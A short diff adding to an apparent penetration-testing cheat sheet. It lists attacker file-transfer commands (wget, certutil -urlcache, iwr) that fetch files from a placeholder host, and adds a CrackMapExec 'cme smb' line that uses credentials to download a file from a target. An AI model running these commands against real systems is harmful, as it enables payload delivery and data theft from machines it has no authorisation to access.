@@ -46,6 +46,9 @@ wget http://<ip>:<port>/<file>
 certutil -urlcache -split -f http://<ip>:<port>/<file> <output_path>
 
 iwr -uri http://<ip>:<port>/<file> -Outfile <output_path>
+
+#Download from target.
+cme smb <ip> -u <user> -p <pass> --get-file '<path>'
 ```
 ##### Win-RM
 ```
